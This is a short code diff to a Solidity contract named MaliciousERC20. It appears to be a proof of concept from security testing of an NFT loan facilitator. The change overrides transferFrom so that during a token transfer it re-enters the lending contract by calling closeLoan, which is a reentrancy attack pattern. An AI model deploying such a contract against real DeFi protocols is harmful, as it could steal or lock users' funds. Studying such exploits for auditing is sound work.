@@ -17,13 +17,15 @@ contract MaliciousERC20 is ERC20, IERC721Receiver {
         _mint(to, amount * (10**decimals()));
     }
 
-    function transfer(address recipient, uint256 amount)
+    function transferFrom(address from, address to, uint256 amount)
         public
         virtual
         override
         returns (bool)
     {
-        _transfer(_msgSender(), recipient, amount);
+        address spender = _msgSender();
+        _spendAllowance(from, spender, amount);
+        _transfer(from, to, amount);
         nftLoanFacilitator.closeLoan(1, address(this));
         return true;
     }
